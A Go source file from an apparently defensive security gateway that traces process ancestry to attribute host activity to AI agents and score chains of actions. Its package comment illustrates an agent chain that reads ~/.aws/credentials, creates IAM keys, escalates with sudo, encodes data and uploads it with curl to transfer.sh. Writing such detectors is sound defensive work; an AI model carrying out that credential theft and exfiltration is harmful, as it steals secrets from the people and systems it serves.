// Copyright 2026 Cisco Systems, Inc. and its affiliates
// Copyright (c) 2026 Mike Storm. All rights reserved.
//
// Derived from ShadowClaw -- Universal Shadow AI Detector, by Mike Storm,
// Distinguished Engineer, CCIE Security 13847. Reimplemented in Go and
// absorbed into the DefenseClaw gateway; see NOTICE for the modifications.
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.
//
// SPDX-License-Identifier: Apache-2.0

// Package agentchain keeps process ancestry, attributes every host-plane
// observation to the agent ultimately responsible for it, and scores the
// accumulated chain against one session.
//
// An agent that can run shell commands is not usefully described as "a process
// that talks to an API". It reads files, spawns children, and acts:
//
//	claude -> sh -> cat ~/.aws/credentials          credential_access
//	       -> sh -> aws iam create-access-key       identity_creation
//	       -> sh -> sudo ...                        privilege_escalation
//	       -> sh -> tar | base64                    encoded payload
//	       -> curl -T - https://transfer.sh/x       exfiltration
//
// Not one of those steps is worth paging on alone, and five separate per-process
// findings would be five alerts nobody joins up. The sequence is the finding.
package agentchain

import "math"

// Attribution states classify a process's observed topology.
const (
	// StateAttributed means a live chain to an agent was found.
	StateAttributed = "attributed"
	// StateOrphaned means the process has no live chain to walk.
	StateOrphaned = "orphaned"
	// StateBootPersistent means the init system owns it and always has -- a
	// launch item or unit, which is to say something arranged to run again
	// without an agent present to start it.
	StateBootPersistent = "boot_persistent"
)

// InitPID is the process whose presence as a parent means there is no live
// chain left to walk. It is 1 on every platform this sensor supports.
const InitPID = 1

// ancestralAuthorityDecay is how much of an agent's answerability survives one
// generation of descent.
const ancestralAuthorityDecay = 0.1

// AncestralAuthority is how much of an agent's authority reaches depth
// generations down.
func AncestralAuthority(depth int) float64 {
	if depth < 0 {
		depth = 0
	}
	return math.Pow(ancestralAuthorityDecay, float64(depth))
}

// Attribution says which agent is answerable for a process, and how strongly.
type Attribution struct {
	RootPID   int
	AgentName string
	// Depth is 0 when the process is the agent, 1 for a direct child, and so on.
	Depth int
	// Via records how the link was established -- "process", "cmdline",
	// "ancestry", or "responsible" -- and is carried into the finding so an
	// analyst can weigh it.
	Via string
	// State is the observed topology. Always StateAttributed on a value
	// returned by Tracker.Attribute, which by definition found a chain.
	State string
}

// Authority is the agent's share of answerability for this process.
//
// Distinct from confidence, and the two must not be conflated. Confidence asks
// whether the attribution is correct; authority asks how much of the agent's
// answerability reaches this far down. A depth-3 descendant is usually
// attributed with high confidence and holds one thousandth of the authority.
//
// Reported rather than folded into scoring. Multiplying a detection confidence
// by 0.1 per generation would erase the ordinary agent -> sh -> cat chain that
// this package exists to follow, and that chain is exactly the case worth
// catching.
func (a Attribution) Authority() float64 { return AncestralAuthority(a.Depth) }
